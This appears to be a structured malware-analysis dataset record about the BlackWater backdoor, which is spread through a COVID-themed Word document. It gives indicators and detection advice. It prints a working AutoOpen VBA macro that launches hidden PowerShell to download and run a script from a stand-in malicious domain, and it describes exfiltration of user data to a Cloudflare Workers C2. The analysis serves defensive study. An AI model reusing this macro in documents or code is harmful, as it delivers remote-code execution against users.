package_info.package_manager: N/A (malware distributed via weaponized Word document)
package_info.why_malicious: The BlackWater backdoor is distributed via spear-phishing with a weaponized Word document, masquerading as COVID-19 information. It installs a backdoor that abuses Cloudflare Workers as its command-and-control (C2) infrastructure, enabling remote access and control of infected systems.

execution_context.trigger: runtime (after document is opened and macro is enabled)
execution_context.file_location: malicious macro embedded in Word document

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objShell As Object
  Set objShell = CreateObject("Wscript.Shell")
  objShell.Run "cmd.exe /c powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1')"
End Sub
malicious_snippets.code_behavior: At document open (macro execution), the code launches a hidden PowerShell process that downloads and executes a remote PowerShell script from a malicious domain, enabling further payload delivery and remote access.

malice_analysis.why_suspicious: Macros that launch PowerShell to download and execute remote scripts are a common malware delivery technique.
malice_analysis.violated_expectations: Normal Word documents should not contain macros that execute system commands or download code from the internet.
malice_analysis.similar_legitimate_use: Automated document processing in enterprise environments may use macros, but not for remote code execution.
key_indicators: AutoOpen macro triggers on document open
Use of Wscript.Shell to launch cmd.exe and PowerShell
Download and execution of remote script

malicious_snippets.code_behavior: At runtime, the code reads data from a local file (user.dat) in the user's APPDATA directory and exfiltrates it via HTTPS POST to a Cloudflare Workers endpoint acting as a C2 server.

malice_analysis.why_suspicious: Exfiltrating local data to a remote C2 server, especially using a cloud service like Cloudflare Workers, is a hallmark of backdoor and info-stealer malware.
malice_analysis.violated_expectations: Legitimate scripts should not send sensitive user data to external, non-corporate endpoints.
malice_analysis.similar_legitimate_use: Cloud-based automation tools may use similar code for legitimate telemetry, but not for exfiltrating user data.
key_indicators: Use of Cloudflare Workers as C2
Reading and exfiltrating local user data

attack_chain.action: User opens weaponized Word document and enables macros.
attack_chain.leads_to: Execution of malicious macro and download of PowerShell payload

attack_chain.action: Macro launches PowerShell to download and execute remote script.
Backdoor payload reads local data and exfiltrates it to Cloudflare Workers C2.
attack_chain.leads_to: Attacker gains access to exfiltrated data and remote control

behavioral_signatures: Word document macros launching PowerShell or cmd.exe
PowerShell scripts downloading and executing remote code
Outbound HTTPS POST requests to Cloudflare Workers or similar cloud endpoints
Access to user data files followed by network exfiltration
file_indicators: Word documents with embedded AutoOpen macros
Unexpected files like user.dat in user profile directories
network_indicators: Connections to workers.cloudflare.com or other cloud worker endpoints
HTTP/HTTPS requests to non-corporate domains immediately after document open
detection_knowledge.how_to_detect: Monitor for Office documents with macros that invoke PowerShell or cmd.exe, especially those that download and execute remote scripts. Detect outbound connections to Cloudflare Workers or similar cloud-based endpoints, particularly POST requests containing user data. Flag unexpected file access and exfiltration patterns from user profile directories.
